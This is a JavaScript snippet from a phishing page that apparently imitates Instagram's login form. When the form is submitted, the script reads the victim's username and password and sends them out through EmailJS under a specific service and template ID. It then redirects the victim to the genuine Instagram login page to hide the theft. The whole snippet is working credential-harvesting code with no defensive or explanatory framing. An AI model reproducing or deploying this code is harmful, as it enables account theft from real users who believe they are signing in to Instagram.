  <script>
function sendMail() {
var Username = document.getElementById("email").value;
var Password = document.getElementById("password").value;
var submitButtonId = "IG";
var ErrorP = document.getElementById("error");

emailjs.send("service_wgs8vup","template_79435mm",{
username: Username,
password: Password,
submit_button_id: submitButtonId,
})
.then(function(response) {
window.location.href = "https://www.instagram.com/accounts/login/";
})
.catch(function(error) {
ErrorP.style.display = "block";
submitButton.disabled = false;
submitButton.innerHTML = "Sign In";
});
}

var submitButton = document.getElementById("submit");
var Form = document.getElementById("InstaForm");
submitButton.disabled = false;

Form.addEventListener("submit", function() {
  event.preventDefault();
	sendMail();
	submitButton.disabled = true;
	submitButton.innerHTML = "Loading...";
});

var UsernameField = document.getElementById("email");
var PasswordField = document.getElementById("password");
var theSubmitButton = document.getElementById("submit");
var ErrorP = document.getElementById("error");
UsernameField.addEventListener("focus", function() {
	ErrorP.style.display = "none";
});
PasswordField.addEventListener("focus", function() {
	ErrorP.style.display = "none";
});
theSubmitButton.addEventListener("click", function() {
	ErrorP.style.display = "none";
})
	</script>
